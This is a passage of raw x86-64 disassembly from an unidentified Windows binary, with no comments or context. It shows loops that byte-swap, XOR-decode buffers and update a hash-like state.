   1400538a2:	cmp    eax,0x2
   1400538a5:	je     0x14005398c
   1400538ab:	and    DWORD PTR [rbp+0xcc0],0x0
   1400538b2:	lea    rcx,[rip+0xfffffffffffad7c7]        # 0x140001080
   1400538b9:	mov    rdx,QWORD PTR [rbp+0x1150]
   1400538c0:	push   0x40
   1400538c2:	pop    r8
   1400538c4:	lea    r9,[rbp+0xcc0]
   1400538cb:	call   QWORD PTR [rip+0x40f37]        # 0x140094808
   1400538d1:	test   eax,eax
   1400538d3:	sete   cl
   1400538d6:	inc    cl
   1400538d8:	mov    BYTE PTR [rip+0x451af],cl        # 0x140098a8d
   1400538de:	test   eax,eax
   1400538e0:	je     0x14005398c
   1400538e6:	mov    al,BYTE PTR [rip+0x452cc]        # 0x140098bb8
   1400538ec:	cmp    al,0x1
   1400538ee:	je     0x140053913
   1400538f0:	movzx  eax,al
   1400538f3:	test   eax,eax
   1400538f5:	jne    0x14005398c
   1400538fb:	call   0x140065d51
   140053900:	test   rax,rax
   140053903:	sete   cl
   140053906:	inc    cl
   140053908:	mov    BYTE PTR [rip+0x452aa],cl        # 0x140098bb8
   14005390e:	test   rax,rax
   140053911:	je     0x14005398c
   140053913:	call   0x140064227
   140053918:	mov    eax,0xc8c291de
   14005391d:	xchg   DWORD PTR [rip+0x451bd],eax        # 0x140098ae0
   140053923:	call   QWORD PTR [rip+0x40d27]        # 0x140094650
   140053929:	mov    eax,eax
   14005392b:	mov    QWORD PTR [rip+0x446ce],rax        # 0x140098000
   140053932:	lea    rcx,[rbp+0x7d0]
   140053939:	push   0xffffffffffffffff
   14005393b:	pop    rdx
   14005393c:	call   0x14002b840
   140053941:	xor    eax,eax
   140053943:	xchg   DWORD PTR [rip+0x45197],eax        # 0x140098ae0
   140053949:	mov    BYTE PTR [rip+0x4513e],0x0        # 0x140098a8e
   140053950:	mov    eax,DWORD PTR [rbp+0x7d0]
   140053956:	add    DWORD PTR [rbp+0xd88],eax
   14005395c:	mov    eax,DWORD PTR [rbp+0x7d4]
   140053962:	add    DWORD PTR [rbp+0xd8c],eax
   140053968:	mov    eax,DWORD PTR [rbp+0x7d8]
   14005396e:	add    DWORD PTR [rbp+0xd90],eax
   140053974:	mov    eax,DWORD PTR [rbp+0x7dc]
   14005397a:	add    DWORD PTR [rbp+0xd94],eax
   140053980:	mov    eax,DWORD PTR [rbp+0x7e0]
   140053986:	add    DWORD PTR [rbp+0xd98],eax
   14005398c:	mov    BYTE PTR [rip+0x450f9],0x0        # 0x140098a8c
   140053993:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14005399a:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   1400539a1:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   1400539a8:	xor    eax,eax
   1400539aa:	cmp    rax,0x14
   1400539ae:	je     0x1400539c6
   1400539b0:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   1400539b7:	bswap  ecx
   1400539b9:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   1400539c0:	add    rax,0x4
   1400539c4:	jmp    0x1400539aa
   1400539c6:	mov    r8,QWORD PTR [rbp+0xd20]
   1400539cd:	mov    eax,r13d
   1400539d0:	shr    eax,0x3
   1400539d3:	and    eax,0x1f
   1400539d6:	lea    rcx,[rax+rbp*1]
   1400539da:	add    rcx,0x7d0
   1400539e1:	xor    r9d,r9d
   1400539e4:	xor    edx,edx
   1400539e6:	xor    eax,eax
   1400539e8:	cmp    r9,0x10
   1400539ec:	je     0x140053a07
   1400539ee:	shld   rax,rdx,0x8
   1400539f3:	mov    r10,rdx
   1400539f6:	shl    r10,0x8
   1400539fa:	movzx  edx,BYTE PTR [rcx+r9*1]
   1400539ff:	inc    r9
   140053a02:	or     rdx,r10
   140053a05:	jmp    0x1400539e8
   140053a07:	push   0xffffffffffffffff
   140053a09:	pop    r9
   140053a0b:	mov    r10,r9
   140053a0e:	mov    ecx,r8d
   140053a11:	shl    r10,cl
   140053a14:	cmp    r8,0x40
   140053a18:	not    r10
   140053a1b:	cmovae r10,r9
   140053a1f:	and    r13d,0x7
   140053a23:	lea    ecx,[r8+r13*1]
   140053a27:	neg    cl
   140053a29:	shrd   rdx,rax,cl
   140053a2d:	shr    rax,cl
   140053a30:	test   cl,0x40
   140053a33:	cmove  rax,rdx
   140053a37:	and    rax,r10
   140053a3a:	mov    rsi,QWORD PTR [rbp+0xd60]
   140053a41:	add    r8,0x7
   140053a45:	bswap  rax
   140053a48:	shr    r8,0x3
   140053a4c:	mov    QWORD PTR [rbp+0x1060],rax
   140053a53:	mov    r9,rsi
   140053a56:	imul   r9,r8
   140053a5a:	push   0x8
   140053a5c:	pop    rcx
   140053a5d:	sub    rcx,r8
   140053a60:	dec    r8
   140053a63:	mov    rax,QWORD PTR [rbp+0x1168]
   140053a6a:	lea    r11,[rax+r9*1]
   140053a6e:	mov    rax,r9
   140053a71:	xor    edx,edx
   140053a73:	push   0x14
   140053a75:	pop    rdi
   140053a76:	div    rdi
   140053a79:	cmp    rcx,0x8
   140053a7d:	je     0x140053aa3
   140053a7f:	cmp    r8,0x7
   140053a83:	ja     0x140059d80
   140053a89:	imul   rax,rax,0xffffffffffffffec
   140053a8d:	mov    al,BYTE PTR [r11+rax*1]
   140053a91:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140053a98:	inc    rcx
   140053a9b:	inc    r11
   140053a9e:	inc    r9
   140053aa1:	jmp    0x140053a6e
   140053aa3:	mov    r11,QWORD PTR [rbp+0x1060]
   140053aaa:	bswap  r11
   140053aad:	and    r11,r10
   140053ab0:	inc    rsi
   140053ab3:	mov    QWORD PTR [rbp+0xd60],rsi
   140053aba:	mov    r9,QWORD PTR [rbp+0xdd0]
   140053ac1:	mov    rax,QWORD PTR [rbp+0xdc0]
   140053ac8:	mov    r8,QWORD PTR [rbp+0xdc8]
   140053acf:	mov    rdx,r9
   140053ad2:	sub    rdx,r8
   140053ad5:	sub    rdx,rax
   140053ad8:	mov    rcx,QWORD PTR [rbp+0xd20]
   140053adf:	cmp    rdx,rcx
   140053ae2:	cmovae rdx,rcx
   140053ae6:	cmp    rdx,0x1
   140053aea:	adc    rdx,0x0
   140053aee:	mov    r10d,ecx
   140053af1:	sub    r10d,edx
   140053af4:	and    r10b,0x3f
   140053af8:	cmp    rcx,rdx
   140053afb:	movzx  ecx,r10b
   140053aff:	mov    r10d,0x0
   140053b05:	cmovbe ecx,r10d
   140053b09:	shr    r11,cl
   140053b0c:	mov    r10,QWORD PTR [rbp+0xdb0]
   140053b13:	mov    rsi,QWORD PTR [rbp+0xdb8]
   140053b1a:	mov    ecx,edx
   140053b1c:	shld   rsi,r10,cl
   140053b20:	shl    r10,cl
   140053b23:	test   dl,0x40
   140053b26:	cmovne rsi,r10
   140053b2a:	mov    ecx,0x0
   140053b2f:	cmove  rcx,r10
   140053b33:	or     rcx,r11
   140053b36:	mov    QWORD PTR [rbp+0xdb8],rsi
   140053b3d:	mov    QWORD PTR [rbp+0xdb0],rcx
   140053b44:	add    rax,rdx
   140053b47:	mov    QWORD PTR [rbp+0xdc0],rax
   140053b4e:	jmp    0x1400535f6
   140053b53:	add    rax,0xfffffffffffffff8
   140053b57:	mov    QWORD PTR [rbp+0xdc0],rax
   140053b5e:	mov    r9,QWORD PTR [rbp+0xdb8]
   140053b65:	mov    r10,r9
   140053b68:	mov    ecx,eax
   140053b6a:	shr    r10,cl
   140053b6d:	mov    r11,QWORD PTR [rbp+0xdb0]
   140053b74:	mov    rdx,r11
   140053b77:	shrd   rdx,r9,cl
   140053b7b:	push   0xffffffffffffffff
   140053b7d:	pop    rdi
   140053b7e:	mov    rsi,rdi
   140053b81:	shl    rsi,cl
   140053b84:	test   al,0x40
   140053b86:	cmovne rdx,r10
   140053b8a:	mov    ecx,0x0
   140053b8f:	cmove  rcx,rsi
   140053b93:	cmove  rsi,rdi
   140053b97:	not    rsi
   140053b9a:	not    rcx
   140053b9d:	and    rcx,r11
   140053ba0:	and    rsi,r9
   140053ba3:	test   rax,rax
   140053ba6:	cmove  rsi,rax
   140053baa:	cmove  rcx,rax
   140053bae:	mov    QWORD PTR [rbp+0xdb0],rcx
   140053bb5:	mov    QWORD PTR [rbp+0xdb8],rsi
   140053bbc:	add    r8,0x8
   140053bc0:	mov    QWORD PTR [rbp+0xdc8],r8
   140053bc7:	inc    r14
   140053bca:	lea    rcx,[rbp+0x710]
   140053bd1:	call   0x14003c141
   140053bd6:	jmp    0x1400535c7
   140053bdb:	mov    rax,QWORD PTR [rbp+0x710]
   140053be2:	mov    QWORD PTR [rbp+0xf70],rax
   140053be9:	mov    rax,QWORD PTR [rbp+0x718]
   140053bf0:	mov    QWORD PTR [rbp+0x1160],rax
   140053bf7:	mov    rax,QWORD PTR [rbp+0x720]
   140053bfe:	mov    QWORD PTR [rbp+0x1148],rax
   140053c05:	lea    rcx,[rbp+0x710]
   140053c0c:	push   0x3a
   140053c0e:	pop    rdx
   140053c0f:	call   0x14003c111
   140053c14:	xor    r14d,r14d
   140053c17:	cmp    r14,0x3a
   140053c1b:	je     0x14005422b
   140053c21:	mov    r8,QWORD PTR [rbp+0xdc8]
   140053c28:	mov    r9,QWORD PTR [rbp+0xdd0]
   140053c2f:	lea    rax,[r8+0x8]
   140053c33:	cmp    rax,r9
   140053c36:	jbe    0x140053c3f
   140053c38:	xor    edx,edx
   140053c3a:	jmp    0x140054217
   140053c3f:	mov    rax,QWORD PTR [rbp+0xdc0]
   140053c46:	cmp    rax,0x8
   140053c4a:	jae    0x1400541a3
   140053c50:	mov    rcx,QWORD PTR [rbp+0xd60]
   140053c57:	cmp    rcx,QWORD PTR [rbp+0xd68]
   140053c5e:	jae    0x140053ca4
   140053c60:	mov    rcx,QWORD PTR [rbp+0xd18]
   140053c67:	mov    rdx,QWORD PTR [rbp+0xd58]
   140053c6e:	cmp    rdx,rcx
   140053c71:	jae    0x140053ca4
   140053c73:	lea    rax,[rbx+0x10]
   140053c77:	movzx  r13d,BYTE PTR [rax+rdx*1]
   140053c7c:	and    r13d,0x7f
   140053c80:	lea    rax,[rdx+0x1]
   140053c84:	cmp    rax,rcx
   140053c87:	jae    0x140053cb2
   140053c89:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   140053c8f:	test   r8b,r8b
   140053c92:	jns    0x140053cac
   140053c94:	shl    r13,0x7
   140053c98:	and    r8d,0x7f
   140053c9c:	or     r13,r8
   140053c9f:	mov    rdx,rax
   140053ca2:	jmp    0x140053c80
   140053ca4:	xor    r11d,r11d
   140053ca7:	jmp    0x14005411f
   140053cac:	inc    rdx
   140053caf:	mov    rcx,rdx
   140053cb2:	mov    QWORD PTR [rbp+0xd58],rcx
   140053cb9:	mov    rax,r13
   140053cbc:	shr    rax,0x8
   140053cc0:	mov    rsi,r13
   140053cc3:	shr    rsi,0x28
   140053cc7:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   140053cce:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140053cd5:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   140053cdc:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140053ce3:	mov    DWORD PTR [rbp+0x7d0],eax
   140053ce9:	lea    rax,[rip+0x34368]        # 0x140088058
   140053cf0:	mov    QWORD PTR [rsp+0x20],rax
   140053cf5:	lea    rcx,[rbp+0xf80]
   140053cfc:	push   0x4
   140053cfe:	pop    rdx
   140053cff:	lea    r8,[rbp+0x7d0]
   140053d06:	mov    r9,rdx
   140053d09:	call   0x1400638fe
   140053d0e:	mov    BYTE PTR [rbp+0xf84],sil
   140053d15:	mov    rsi,QWORD PTR [rbp+0xd30]
   140053d1c:	cmp    QWORD PTR [rbp+0xd78],rsi
   140053d23:	jbe    0x140053e53
   140053d29:	mov    r9,QWORD PTR [rbp+0xd38]
   140053d30:	cmp    r9,0x4
   140053d34:	ja     0x140059d9c
   140053d3a:	mov    rcx,QWORD PTR [rbp+0xd40]
   140053d41:	cmp    rcx,0x5
   140053d45:	jae    0x140059dae
   140053d4b:	mov    r8,QWORD PTR [rbp+0xd78]
   140053d52:	cmp    r8,rsi
   140053d55:	je     0x140059dbc
   140053d5b:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   140053d62:	mov    cl,BYTE PTR [rbp+0xd48]
   140053d68:	rol    eax,cl
   140053d6a:	sub    r8,rsi
   140053d6d:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   140053d75:	xor    edx,edx
   140053d77:	div    r8
   140053d7a:	mov    rdi,rdx
   140053d7d:	mov    rax,QWORD PTR [rbp+0xd80]
   140053d84:	mov    QWORD PTR [rbp+0x1060],rax
   140053d8b:	cmp    rsi,0x40
   140053d8f:	push   0x40
   140053d91:	pop    rax
   140053d92:	cmovae rsi,rax
   140053d96:	movaps XMMWORD PTR [rbp+0x800],xmm7
   140053d9d:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140053da4:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140053dab:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140053db2:	lea    rcx,[rbp+0x7d0]
   140053db9:	mov    rdx,rsi
   140053dbc:	call   0x14003c0b8
   140053dc1:	mov    r10,QWORD PTR [rbp+0xd78]
   140053dc8:	test   r10,r10
   140053dcb:	je     0x140053e19
   140053dcd:	mov    rcx,rax
   140053dd0:	mov    r8,rdx
   140053dd3:	mov    rax,rdx
   140053dd6:	add    rax,rdi
   140053dd9:	mov    r9,QWORD PTR [rbp+0xd70]
   140053de0:	cmp    rax,r10
   140053de3:	jbe    0x140053e03
   140053de5:	xor    r11d,r11d
   140053de8:	cmp    r8,r11
   140053deb:	je     0x140053e19
   140053ded:	lea    rax,[r11+rdi*1]
   140053df1:	xor    edx,edx
   140053df3:	div    r10
   140053df6:	mov    al,BYTE PTR [r9+rdx*1]
   140053dfa:	mov    BYTE PTR [rcx+r11*1],al
   140053dfe:	inc    r11
   140053e01:	jmp    0x140053de8
   140053e03:	add    r9,rdi
   140053e06:	xor    eax,eax
   140053e08:	cmp    r8,rax
   140053e0b:	je     0x140053e19
   140053e0d:	mov    dl,BYTE PTR [r9+rax*1]
   140053e11:	mov    BYTE PTR [rcx+rax*1],dl
   140053e14:	inc    rax
   140053e17:	jmp    0x140053e08
   140053e19:	mov    rcx,QWORD PTR [rbp+0xd28]
   140053e20:	xor    eax,eax
   140053e22:	cmp    rsi,rax
   140053e25:	je     0x140053e53
   140053e27:	cmp    rcx,0x3f
   140053e2b:	ja     0x140059d8e
   140053e31:	mov    edx,eax
   140053e33:	and    edx,0x7
   140053e36:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140053e3d:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   140053e44:	inc    rax
   140053e47:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140053e4e:	inc    rcx
   140053e51:	jmp    0x140053e22
   140053e53:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140053e5a:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140053e61:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140053e68:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140053e6f:	xor    eax,eax
   140053e71:	cmp    rax,0x40
   140053e75:	je     0x140053e8d
   140053e77:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   140053e7e:	bswap  ecx
   140053e80:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140053e87:	add    rax,0x4
   140053e8b:	jmp    0x140053e71
   140053e8d:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   140053e94:	mov    eax,DWORD PTR [rbp+0xd98]
   140053e9a:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   140053ea1:	mov    DWORD PTR [rbp+0x7e0],eax
   140053ea7:	and    DWORD PTR [rbp+0x7e4],0x0
   140053eae:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140053eb5:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   140053ebc:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140053ec3:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   140053eca:	lea    rax,[rbp+0x7e8]
   140053ed1:	movups XMMWORD PTR [rax+0x30],xmm3
   140053ed5:	movups XMMWORD PTR [rax+0x20],xmm2
   140053ed9:	movups XMMWORD PTR [rax+0x10],xmm1
   140053edd:	movups XMMWORD PTR [rax],xmm0
   140053ee0:	call   0x140064214
   140053ee5:	mov    al,BYTE PTR [rip+0x44ba2]        # 0x140098a8d
   140053eeb:	cmp    al,0x1
   140053eed:	je     0x140053f36
   140053eef:	movzx  eax,al
   140053ef2:	cmp    eax,0x2
   140053ef5:	je     0x140053fdc
   140053efb:	and    DWORD PTR [rbp+0xcc0],0x0
   140053f02:	lea    rcx,[rip+0xfffffffffffad177]        # 0x140001080
   140053f09:	mov    rdx,QWORD PTR [rbp+0x1150]
   140053f10:	push   0x40
   140053f12:	pop    r8
   140053f14:	lea    r9,[rbp+0xcc0]
   140053f1b:	call   QWORD PTR [rip+0x408e7]        # 0x140094808
   140053f21:	test   eax,eax
   140053f23:	sete   cl
   140053f26:	inc    cl
   140053f28:	mov    BYTE PTR [rip+0x44b5f],cl        # 0x140098a8d
   140053f2e:	test   eax,eax
   140053f30:	je     0x140053fdc
   140053f36:	mov    al,BYTE PTR [rip+0x44c7c]        # 0x140098bb8
   140053f3c:	cmp    al,0x1
   140053f3e:	je     0x140053f63
   140053f40:	movzx  eax,al
   140053f43:	test   eax,eax
   140053f45:	jne    0x140053fdc
   140053f4b:	call   0x140065d51
   140053f50:	test   rax,rax
   140053f53:	sete   cl
   140053f56:	inc    cl
   140053f58:	mov    BYTE PTR [rip+0x44c5a],cl        # 0x140098bb8
   140053f5e:	test   rax,rax
   140053f61:	je     0x140053fdc
   140053f63:	call   0x140064227
   140053f68:	mov    eax,0xc8c291de
   140053f6d:	xchg   DWORD PTR [rip+0x44b6d],eax        # 0x140098ae0
   140053f73:	call   QWORD PTR [rip+0x406d7]        # 0x140094650
   140053f79:	mov    eax,eax
   140053f7b:	mov    QWORD PTR [rip+0x4407e],rax        # 0x140098000
   140053f82:	lea    rcx,[rbp+0x7d0]
   140053f89:	push   0xffffffffffffffff
   140053f8b:	pop    rdx
   140053f8c:	call   0x14002b840
   140053f91:	xor    eax,eax
   140053f93:	xchg   DWORD PTR [rip+0x44b47],eax        # 0x140098ae0
   140053f99:	mov    BYTE PTR [rip+0x44aee],0x0        # 0x140098a8e
   140053fa0:	mov    eax,DWORD PTR [rbp+0x7d0]
   140053fa6:	add    DWORD PTR [rbp+0xd88],eax
   140053fac:	mov    eax,DWORD PTR [rbp+0x7d4]
   140053fb2:	add    DWORD PTR [rbp+0xd8c],eax
   140053fb8:	mov    eax,DWORD PTR [rbp+0x7d8]
   140053fbe:	add    DWORD PTR [rbp+0xd90],eax
   140053fc4:	mov    eax,DWORD PTR [rbp+0x7dc]
   140053fca:	add    DWORD PTR [rbp+0xd94],eax
   140053fd0:	mov    eax,DWORD PTR [rbp+0x7e0]
   140053fd6:	add    DWORD PTR [rbp+0xd98],eax
   140053fdc:	mov    BYTE PTR [rip+0x44aa9],0x0        # 0x140098a8c
   140053fe3:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140053fea:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140053ff1:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140053ff8:	xor    eax,eax
   140053ffa:	cmp    rax,0x14
   140053ffe:	je     0x140054016
   140054000:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   140054007:	bswap  ecx
   140054009:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   140054010:	add    rax,0x4
   140054014:	jmp    0x140053ffa
   140054016:	mov    r8,QWORD PTR [rbp+0xd20]
   14005401d:	mov    eax,r13d
   140054020:	shr    eax,0x3
   140054023:	and    eax,0x1f
   140054026:	lea    rcx,[rax+rbp*1]
   14005402a:	add    rcx,0x7d0
   140054031:	xor    r9d,r9d
   140054034:	xor    edx,edx
   140054036:	xor    eax,eax
   140054038:	cmp    r9,0x10
   14005403c:	je     0x140054057
   14005403e:	shld   rax,rdx,0x8
   140054043:	mov    r10,rdx
   140054046:	shl    r10,0x8
   14005404a:	movzx  edx,BYTE PTR [rcx+r9*1]
   14005404f:	inc    r9
   140054052:	or     rdx,r10
   140054055:	jmp    0x140054038
   140054057:	push   0xffffffffffffffff
   140054059:	pop    r9
   14005405b:	mov    r10,r9
   14005405e:	mov    ecx,r8d
   140054061:	shl    r10,cl
   140054064:	cmp    r8,0x40
   140054068:	not    r10
   14005406b:	cmovae r10,r9
   14005406f:	and    r13d,0x7
   140054073:	lea    ecx,[r8+r13*1]
   140054077:	neg    cl
   140054079:	shrd   rdx,rax,cl
   14005407d:	shr    rax,cl
   140054080:	test   cl,0x40
   140054083:	cmove  rax,rdx
   140054087:	and    rax,r10
   14005408a:	mov    rsi,QWORD PTR [rbp+0xd60]
   140054091:	add    r8,0x7
   140054095:	bswap  rax
   140054098:	shr    r8,0x3
   14005409c:	mov    QWORD PTR [rbp+0x1060],rax
   1400540a3:	mov    r9,rsi
   1400540a6:	imul   r9,r8
   1400540aa:	push   0x8
   1400540ac:	pop    rcx
   1400540ad:	sub    rcx,r8
   1400540b0:	dec    r8
   1400540b3:	mov    rax,QWORD PTR [rbp+0x1168]
   1400540ba:	lea    r11,[rax+r9*1]
   1400540be:	mov    rax,r9
   1400540c1:	xor    edx,edx
   1400540c3:	push   0x14
   1400540c5:	pop    rdi
   1400540c6:	div    rdi
   1400540c9:	cmp    rcx,0x8
   1400540cd:	je     0x1400540f3
   1400540cf:	cmp    r8,0x7
   1400540d3:	ja     0x140059d80
   1400540d9:	imul   rax,rax,0xffffffffffffffec
   1400540dd:	mov    al,BYTE PTR [r11+rax*1]
   1400540e1:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   1400540e8:	inc    rcx
   1400540eb:	inc    r11
   1400540ee:	inc    r9
   1400540f1:	jmp    0x1400540be
   1400540f3:	mov    r11,QWORD PTR [rbp+0x1060]
   1400540fa:	bswap  r11
   1400540fd:	and    r11,r10
   140054100:	inc    rsi
   140054103:	mov    QWORD PTR [rbp+0xd60],rsi
   14005410a:	mov    r9,QWORD PTR [rbp+0xdd0]
   140054111:	mov    rax,QWORD PTR [rbp+0xdc0]
   140054118:	mov    r8,QWORD PTR [rbp+0xdc8]
   14005411f:	mov    rdx,r9
   140054122:	sub    rdx,r8
   140054125:	sub    rdx,rax
   140054128:	mov    rcx,QWORD PTR [rbp+0xd20]
   14005412f:	cmp    rdx,rcx
   140054132:	cmovae rdx,rcx
   140054136:	cmp    rdx,0x1
   14005413a:	adc    rdx,0x0
   14005413e:	mov    r10d,ecx
   140054141:	sub    r10d,edx
   140054144:	and    r10b,0x3f
   140054148:	cmp    rcx,rdx
   14005414b:	movzx  ecx,r10b
   14005414f:	mov    r10d,0x0
   140054155:	cmovbe ecx,r10d
   140054159:	shr    r11,cl
   14005415c:	mov    r10,QWORD PTR [rbp+0xdb0]
   140054163:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14005416a:	mov    ecx,edx
   14005416c:	shld   rsi,r10,cl
   140054170:	shl    r10,cl
   140054173:	test   dl,0x40
   140054176:	cmovne rsi,r10
   14005417a:	mov    ecx,0x0
   14005417f:	cmove  rcx,r10
   140054183:	or     rcx,r11
   140054186:	mov    QWORD PTR [rbp+0xdb8],rsi
   14005418d:	mov    QWORD PTR [rbp+0xdb0],rcx
   140054194:	add    rax,rdx
   140054197:	mov    QWORD PTR [rbp+0xdc0],rax
   14005419e:	jmp    0x140053c46
   1400541a3:	add    rax,0xfffffffffffffff8
   1400541a7:	mov    QWORD PTR [rbp+0xdc0],rax
   1400541ae:	mov    r9,QWORD PTR [rbp+0xdb8]
   1400541b5:	mov    r10,r9
   1400541b8:	mov    ecx,eax
   1400541ba:	shr    r10,cl
   1400541bd:	mov    r11,QWORD PTR [rbp+0xdb0]
   1400541c4:	mov    rdx,r11
   1400541c7:	shrd   rdx,r9,cl
   1400541cb:	push   0xffffffffffffffff
   1400541cd:	pop    rdi
   1400541ce:	mov    rsi,rdi
   1400541d1:	shl    rsi,cl
   1400541d4:	test   al,0x40
   1400541d6:	cmovne rdx,r10
   1400541da:	mov    ecx,0x0
   1400541df:	cmove  rcx,rsi
   1400541e3:	cmove  rsi,rdi
   1400541e7:	not    rsi
   1400541ea:	not    rcx
   1400541ed:	and    rcx,r11
   1400541f0:	and    rsi,r9
   1400541f3:	test   rax,rax
   1400541f6:	cmove  rsi,rax
   1400541fa:	cmove  rcx,rax
   1400541fe:	mov    QWORD PTR [rbp+0xdb0],rcx
   140054205:	mov    QWORD PTR [rbp+0xdb8],rsi
   14005420c:	add    r8,0x8
   140054210:	mov    QWORD PTR [rbp+0xdc8],r8
   140054217:	inc    r14
   14005421a:	lea    rcx,[rbp+0x710]
   140054221:	call   0x14003c141
   140054226:	jmp    0x140053c17
   14005422b:	mov    rcx,QWORD PTR [rbp+0x710]
   140054232:	mov    rdx,QWORD PTR [rbp+0x718]
   140054239:	call   0x14006f7f7
   14005423e:	lea    rcx,[rbp+0x710]
   140054245:	push   0x8
   140054247:	pop    rdx
   140054248:	call   0x14003c111
   14005424d:	xor    r14d,r14d
   140054250:	cmp    r14,0x8
   140054254:	je     0x140054864
   14005425a:	mov    r8,QWORD PTR [rbp+0xdc8]
   140054261:	mov    r9,QWORD PTR [rbp+0xdd0]
   140054268:	lea    rax,[r8+0x8]
   14005426c:	cmp    rax,r9
   14005426f:	jbe    0x140054278
   140054271:	xor    edx,edx
   140054273:	jmp    0x140054850
   140054278:	mov    rax,QWORD PTR [rbp+0xdc0]
   14005427f:	cmp    rax,0x8
   140054283:	jae    0x1400547dc
   140054289:	mov    rcx,QWORD PTR [rbp+0xd60]
   140054290:	cmp    rcx,QWORD PTR [rbp+0xd68]
   140054297:	jae    0x1400542dd
   140054299:	mov    rcx,QWORD PTR [rbp+0xd18]
   1400542a0:	mov    rdx,QWORD PTR [rbp+0xd58]
   1400542a7:	cmp    rdx,rcx
   1400542aa:	jae    0x1400542dd
   1400542ac:	lea    rax,[rbx+0x10]
   1400542b0:	movzx  r13d,BYTE PTR [rax+rdx*1]
   1400542b5:	and    r13d,0x7f
   1400542b9:	lea    rax,[rdx+0x1]
   1400542bd:	cmp    rax,rcx
   1400542c0:	jae    0x1400542eb
   1400542c2:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   1400542c8:	test   r8b,r8b
   1400542cb:	jns    0x1400542e5
   1400542cd:	shl    r13,0x7
   1400542d1:	and    r8d,0x7f
   1400542d5:	or     r13,r8
   1400542d8:	mov    rdx,rax
   1400542db:	jmp    0x1400542b9
   1400542dd:	xor    r11d,r11d
   1400542e0:	jmp    0x140054758
   1400542e5:	inc    rdx
   1400542e8:	mov    rcx,rdx
   1400542eb:	mov    QWORD PTR [rbp+0xd58],rcx
   1400542f2:	mov    rax,r13
   1400542f5:	shr    rax,0x8
   1400542f9:	mov    rsi,r13
   1400542fc:	shr    rsi,0x28
   140054300:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   140054307:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14005430e:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   140054315:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14005431c:	mov    DWORD PTR [rbp+0x7d0],eax
   140054322:	lea    rax,[rip+0x33d2f]        # 0x140088058
   140054329:	mov    QWORD PTR [rsp+0x20],rax
   14005432e:	lea    rcx,[rbp+0xf80]
   140054335:	push   0x4
   140054337:	pop    rdx
   140054338:	lea    r8,[rbp+0x7d0]
   14005433f:	mov    r9,rdx
   140054342:	call   0x1400638fe
   140054347:	mov    BYTE PTR [rbp+0xf84],sil
   14005434e:	mov    rsi,QWORD PTR [rbp+0xd30]
   140054355:	cmp    QWORD PTR [rbp+0xd78],rsi
   14005435c:	jbe    0x14005448c
   140054362:	mov    r9,QWORD PTR [rbp+0xd38]
   140054369:	cmp    r9,0x4
   14005436d:	ja     0x140059d9c
   140054373:	mov    rcx,QWORD PTR [rbp+0xd40]
   14005437a:	cmp    rcx,0x5
   14005437e:	jae    0x140059dae
   140054384:	mov    r8,QWORD PTR [rbp+0xd78]
   14005438b:	cmp    r8,rsi
   14005438e:	je     0x140059dbc
   140054394:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   14005439b:	mov    cl,BYTE PTR [rbp+0xd48]
   1400543a1:	rol    eax,cl
   1400543a3:	sub    r8,rsi
   1400543a6:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   1400543ae:	xor    edx,edx
   1400543b0:	div    r8
   1400543b3:	mov    rdi,rdx
   1400543b6:	mov    rax,QWORD PTR [rbp+0xd80]
   1400543bd:	mov    QWORD PTR [rbp+0x1060],rax
   1400543c4:	cmp    rsi,0x40
   1400543c8:	push   0x40
   1400543ca:	pop    rax
   1400543cb:	cmovae rsi,rax
   1400543cf:	movaps XMMWORD PTR [rbp+0x800],xmm7
   1400543d6:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   1400543dd:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   1400543e4:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   1400543eb:	lea    rcx,[rbp+0x7d0]
   1400543f2:	mov    rdx,rsi
   1400543f5:	call   0x14003c0b8
   1400543fa:	mov    r10,QWORD PTR [rbp+0xd78]
   140054401:	test   r10,r10
   140054404:	je     0x140054452
   140054406:	mov    rcx,rax
   140054409:	mov    r8,rdx
   14005440c:	mov    rax,rdx
   14005440f:	add    rax,rdi
